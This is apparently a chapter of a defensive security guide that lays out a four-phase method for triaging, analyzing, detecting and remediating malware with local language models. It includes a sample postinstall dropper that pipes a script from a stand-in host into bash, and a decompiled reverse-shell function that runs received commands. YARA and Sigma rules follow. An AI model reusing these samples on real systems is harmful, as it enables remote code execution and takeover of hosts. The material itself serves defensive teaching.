# Chapter 2: The TADR Methodology

TADR is a four-phase loop for security vulnerability assessment: **Triage, Analyze, Detect, Remediate**. It is designed to be repeatable regardless of the artifact type and practical on constrained hardware.

This chapter explains each phase in detail with generic examples. The exercises in Chapters 5-7 apply TADR to specific attack surfaces.

```
    +----------+       +-----------+       +----------+       +------------+
    |          |       |           |       |          |       |            |
    |  TRIAGE  +------>+  ANALYZE  +------>+  DETECT  +------>+  REMEDIATE |
    |          |       |           |       |          |       |            |
    +----+-----+       +-----------+       +----------+       +------+-----+
         ^                                                           |
         |                                                           |
         +-----------------------------------------------------------+
                          feedback loop: update prompts,
                          models, and detection rules
```

## Phase 1: Triage

**Goal**: Quickly determine whether an artifact deserves deeper analysis, and route it to the right analysis path.

**Time budget**: Minutes, not hours. Triage should be fast.

### What you do

1. **Classify the artifact**: Is this a dependency/package, a binary executable, a script, a configuration file, or something else?
2. **Run a fast model check**: Use a lightweight model (`gemma3:4b` or `phi3:mini`) to get an initial read.
3. **Decide**: Suspicious (proceed to Analyze), benign (document and close), or unclear (gather more context).

### Decision tree

```
Artifact received
    |
    +-- Is it a package/dependency? (package.json, lockfile, tarball)
    |       --> Use phi3:mini for postinstall script review
    |       --> Check against known-bad versions
    |
    +-- Is it a binary? (PE, ELF, Mach-O, firmware blob)
    |       --> Use llama3.2:3b for initial strings/header analysis
    |       --> Route to Ghidra or radare2 in Analyze phase
    |
    +-- Is it a script? (JS, Python, shell, RouterOS .rsc)
    |       --> Use phi3:mini for code-level explanation
    |       --> Look for obfuscation markers (eval, atob, hex arrays)
    |
    +-- Is it a config file? (RouterOS export, nginx conf, CI yaml)
            --> Use llama3.2:3b for suspicious-pattern scan
            --> Look for unexpected rules, cron jobs, or redirects
```

### Example: Triage input and output

**Input** (to `gemma3:4b`):

```
I found this postinstall script in a newly added npm dependency.
Give me a one-paragraph assessment: is this suspicious?

---
#!/bin/sh
curl -sL https://cdn.example.com/update.sh | bash
rm -f /tmp/.cache_update
```

**Expected output** (model response):

> This script is highly suspicious. It downloads and immediately executes a remote
> shell script via curl, then deletes a temp file that may have been created by
> the downloaded payload. Legitimate postinstall scripts typically run build tools
> (node-gyp, tsc) or copy files locally. Silent remote code execution combined
> with cleanup is a strong indicator of a supply-chain attack dropper.

**Triage verdict**: Suspicious. Proceed to Analyze.

### What good triage looks like

- Fast: 1-2 prompts, under 5 minutes
- Decisive: clear verdict (suspicious / benign / unclear)
- Documented: note what you observed and why you made the call
- Routed: if suspicious, you know which tool and model to use next

### What bad triage looks like

- Spending an hour on a single artifact before deciding
- Skipping triage and jumping straight to Ghidra for everything
- Trusting the model's first answer without checking the actual artifact
- No documentation of the decision

---

## Phase 2: Analyze

**Goal**: Understand what the artifact actually does. Produce a plain-English explanation of its behavior, capabilities, and intent.

**Time budget**: 15 minutes to a few hours, depending on complexity.

### What you do

1. **Prepare the artifact**: Deobfuscate scripts, decompile binaries, extract relevant sections. The goal is to get the artifact into a form the model can reason about.
2. **Feed to a deeper model**: Use `vuln-assessor` (custom Modelfile) or `phi3:mini` for code, `llama3.2:3b` for general reasoning.
3. **Ask structured questions**:
   - "What does this code/function do in plain English?"
   - "What system resources does it access (network, filesystem, registry)?"
   - "What is the likely intent (backdoor, data exfiltration, persistence, lateral movement)?"
   - "What artifacts would it leave on disk, in logs, or on the network?"
4. **Cross-validate**: Compare model output against what you can directly observe (strings, imports, API calls). Flag any hallucinations.

### Preparation by artifact type

| Artifact type | Preparation steps | Primary model |
|---|---|---|
| npm postinstall script | Beautify/deobfuscate JS, extract inline strings | `phi3:mini` |
| Binary (PE/ELF/Mach-O) | Load in Ghidra, export decompiled functions to text. Or: use `r2 -A` + `pdf` in radare2 | `vuln-assessor` via GhidrOllama or CLI |
| Obfuscated JavaScript | Run through a beautifier, decode `atob`/hex, save cleaned version | `phi3:mini` or `ios-js-re` custom model |
| RouterOS script (.rsc) | No preparation needed, paste directly | `llama3.2:3b` |
| Config file | Extract the relevant section | `llama3.2:3b` |

### Example: Analyze input and output

**Input** (to `vuln-assessor`):

```
Explain this decompiled C function from Ghidra. What does it do?
Is this part of a backdoor, RAT, or legitimate application?

---
void FUN_00401000(void) {
    int sock;
    struct sockaddr_in server;
    char buffer[1024];

    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    server.sin_addr.s_addr = inet_addr("203.0.113.50");

    connect(sock, (struct sockaddr *)&server, sizeof(server));

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        recv(sock, buffer, sizeof(buffer), 0);
        system(buffer);
    }
}
```

**Expected output** (model response):

> This function implements a basic reverse shell / RAT client:
>
> 1. Creates a TCP socket
> 2. Connects to 203.0.113.50 on port 4444
> 3. Enters an infinite loop receiving commands and executing them via system()
>
> This is a textbook command-and-control (C2) pattern. The hardcoded IP and port
> are IoCs. The use of system() to execute received data means the attacker has
> full shell access once connected.
>
> **Artifacts to expect**:
> - Network connection to 203.0.113.50:4444
> - Process spawning child shells
> - No persistence mechanism visible in this function (check other functions)
>
> **Verdict**: This is a RAT/backdoor component, not a legitimate application.

### What good analysis looks like

- Clear explanation a non-RE-expert can understand
- Identifies specific behaviors (network calls, file drops, persistence)
- Lists concrete artifacts (IPs, ports, file paths, registry keys)
- Flags uncertainty ("this function alone doesn't show persistence; check related functions")
- Cross-validated against direct observation

### What bad analysis looks like

- Accepting model output without checking against the actual artifact
- Vague conclusions ("this looks suspicious" without specifics)
- Missing the forest for the trees (analyzing individual instructions without explaining the overall behavior)
- Not asking follow-up questions when the first answer is incomplete

---

## Phase 3: Detect

**Goal**: Translate your analysis into machine-readable detection rules that can be deployed to your security stack.

**Time budget**: 15-30 minutes per rule set.

### What you produce

| Detection type | Purpose | Deployed to |
|---|---|---|
| **YARA rules** | Match file contents (strings, byte patterns, structure) | EDR, file scanners, CI pipeline |
| **Sigma rules** | Match log events (process creation, network connections, file operations) | SIEM (Splunk, Elastic, etc.) |
| **IoC lists** | Known-bad indicators (hashes, IPs, domains, file paths) | Threat intel platform, firewall, DNS blocklist |
| **WAF rules** | Match malicious web traffic patterns | ModSecurity, nginx, cloud WAF |
| **Log queries** | Ad-hoc searches for evidence of compromise | Grep, jq, Splunk SPL, Elastic KQL |

### What you do

1. **Extract IoCs from your analysis**: IPs, domains, file hashes, registry keys, file paths, process names.
2. **Ask the model to draft detection rules**: Use the detection-rule prompt templates (see Chapter 8 appendix).
3. **Review and refine**: Model-generated rules are starting points. Check for:
   - False positive potential (is the pattern too broad?)
   - Coverage gaps (does the rule miss variants?)
   - Syntax correctness (will the rule actually parse?)
4. **Test against your synthetic artifacts**: Before deploying to production, verify the rule matches the exercise sample.

### Example: Detect input and output

**Input** (to `vuln-assessor`):

```
Based on this analysis of a RAT binary that connects to 203.0.113.50:4444
and executes received commands via system(), draft:

1. A YARA rule that matches this binary's characteristics
2. A Sigma rule that detects this behavior in endpoint logs
3. An IoC list in structured format
```

**Expected output** (model response):

YARA rule:

```yara
rule RAT_ReverseShell_Generic {
    meta:
        description = "Detects basic reverse shell RAT pattern"
        author = "SecDevOps Guide Exercise"
        date = "2026-04-03"

    strings:
        $ip = "203.0.113.50"
        $func_socket = "socket" ascii
        $func_connect = "connect" ascii
        $func_system = "system" ascii
        $port = { 11 5C }  // 4444 in network byte order

    condition:
        uint32(0) == 0xFEEDFACF and  // Mach-O magic
        $ip and
        all of ($func_*) and
        $port
}
```

Sigma rule:

```yaml
title: Reverse Shell RAT - Outbound Connection
status: experimental
description: Detects outbound TCP connection to known C2 IP on port 4444
logsource:
    category: network_connection
    product: macos
detection:
    selection:
        DestinationIp: '203.0.113.50'
        DestinationPort: 4444
    condition: selection
level: critical
tags:
    - attack.command_and_control
    - attack.t1071
```

IoC list:

```
# IoCs - RAT Reverse Shell (Exercise Sample)
# Type       | Value             | Context
ip           | 203.0.113.50      | C2 server
port         | 4444              | C2 port
function     | system()          | Command execution via received data
behavior     | reverse_shell     | Connects out, receives commands, executes
```

### What good detection looks like

- Rules are specific enough to avoid false positives
- Rules are general enough to catch variants (not just the exact sample)
- Multiple detection layers (file-based + behavior-based + network-based)
- Tested against the exercise artifact before deployment
- Documented with metadata (author, date, description, MITRE ATT&CK mapping)

### What bad detection looks like

- Copy-pasting model output without reviewing syntax
- A single detection rule with no fallback
- Rules so broad they fire on legitimate software
- No testing against the actual artifact

---

## Phase 4: Remediate

**Goal**: Contain the threat, eradicate it, recover to a clean state, and feed lessons back into your process.

**Time budget**: Varies. The important thing is completeness, not speed.

### The four sub-steps

#### 4a. Contain

Stop the bleeding. Prevent the threat from spreading or doing more damage.

- **Network**: Block C2 IPs/domains at the firewall. Isolate affected hosts.
- **Process**: Kill malicious processes. Disable compromised accounts.
- **Pipeline**: Quarantine affected build artifacts. Pin dependencies to known-good versions.

#### 4b. Eradicate

Remove all traces of the threat from affected systems.

- **Files**: Delete dropped binaries, scripts, and artifacts.
- **Persistence**: Remove cron jobs, launch agents, registry keys, systemd units.
- **Dependencies**: Remove or replace poisoned packages. Regenerate lockfiles.
- **MikroTik-specific**: Revert RouterOS configuration changes, update firmware, rotate credentials.

#### 4c. Recover

Verify the system is clean and return to normal operation.

- **Verify**: Re-run detection rules against the remediated system. Confirm no matches.
- **Monitor**: Increase logging verbosity for a monitoring period.
- **Restore**: If needed, restore from known-good backups.
- **Test**: Run your standard test/build/deploy pipeline and confirm it passes.

#### 4d. Lessons learned

Update your tools and process based on what you found.

- **Update prompts**: Did the triage prompt miss something? Refine it.
- **Update Modelfiles**: Should the system prompt mention this new attack pattern?
- **Update detection rules**: Add the new rules to your permanent rule set.
- **Update checklists**: Should the air-gap transfer checklist include a new verification step?

### Example: Remediate input and output

**Input** (to `vuln-assessor`):

```
Given a RAT binary that:
- Connects to 203.0.113.50:4444
- Executes commands via system()
- Was found as /usr/local/bin/.update-helper on a macOS host

Provide remediation commands for:
1. Containment (macOS)
2. Eradication (macOS)
3. Verification that the system is clean
```

**Expected output** (model response):

Containment:

```bash
# Block C2 IP at the host firewall
sudo pfctl -t blocklist -T add 203.0.113.50
sudo pfctl -e

# Kill any process with an open connection to the C2
lsof -i @203.0.113.50:4444 | awk 'NR>1 {print $2}' | xargs kill -9

# Quarantine the binary (move, don't delete yet - preserve for analysis)
sudo mv /usr/local/bin/.update-helper /var/quarantine/
```

Eradication:

```bash
# Check for persistence mechanisms
# Launch agents
ls -la ~/Library/LaunchAgents/ /Library/LaunchAgents/ /Library/LaunchDaemons/ \
    | grep -i update

# Remove any suspicious launch agent
sudo launchctl unload /Library/LaunchDaemons/com.update.helper.plist
sudo rm /Library/LaunchDaemons/com.update.helper.plist

# Remove the quarantined binary after analysis is complete
sudo rm /var/quarantine/.update-helper

# Check crontab
crontab -l | grep -i update
```

Verification:

```bash
# Confirm the binary is gone
ls -la /usr/local/bin/.update-helper  # should not exist

# Confirm no connections to C2
lsof -i @203.0.113.50  # should return nothing

# Confirm no persistence
launchctl list | grep -i update  # should return nothing

# Run your YARA rule against the filesystem
yara /path/to/rat_reverseshell.yar /usr/local/bin/
```

### What good remediation looks like

- All four sub-steps completed (contain, eradicate, recover, lessons learned)
- Platform-specific commands (not generic advice)
- Verification steps that confirm the threat is actually gone
- Lessons fed back into the process (updated prompts, rules, checklists)

### What bad remediation looks like

- Stopping at containment without eradicating
- Deleting evidence before analysis is complete
- No verification that remediation actually worked
- Not updating your process based on what you learned

---

## The feedback loop

TADR is a loop, not a line. After every exercise (and every real incident), ask:

1. **Did my triage prompts catch this?** If not, update them.
2. **Did my analysis models give useful answers?** If not, refine the Modelfile or try a different model.
3. **Did my detection rules match?** If not, improve them.
4. **Did my remediation steps work?** If not, add the missing steps.

Over time, your prompts get sharper, your models get better-tuned, your rules get broader, and your remediation playbooks get more complete. The air-gapped laptop becomes a continuously improving analysis environment.

---

## Next steps

- **Chapter 3**: Set up your air-gapped lab with Ollama, models, and RE tools.
- **Chapter 4**: Learn the operational discipline for air-gap transfers.
- **Chapters 5-7**: Apply TADR to three progressively harder attack surfaces.
